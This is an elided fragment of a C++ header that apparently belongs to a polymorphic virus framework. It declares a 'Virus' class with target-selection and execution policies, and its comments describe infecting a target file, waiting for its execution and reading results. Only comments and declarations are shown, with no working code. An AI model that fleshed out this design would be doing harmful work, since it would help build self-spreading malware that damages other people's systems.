...
namespace poly {
    ...
    //! the assembly code and its serialization. See PolymorphicEngine for its
    ...
    class Virus : private TargetSelectPolicy, private ExecPolicy {
      public:
        ...
        //! fail.
        //! \param target path of the specified target to infect. If is empty,
        //! it will be retrieved calling TargetSelectPolicy::next_target(...).
        //! Default is empty.
        ...
        //!
        //! Wait until the end of the target execution. This method will fail
        //! if:
        ...
        //! ```ExecPolicy::get_result(...)```. If no execution was performed, it
        //! is up to ```ExecPolicy::get_result(...)``` to decide what value to
        //! return.
        //!
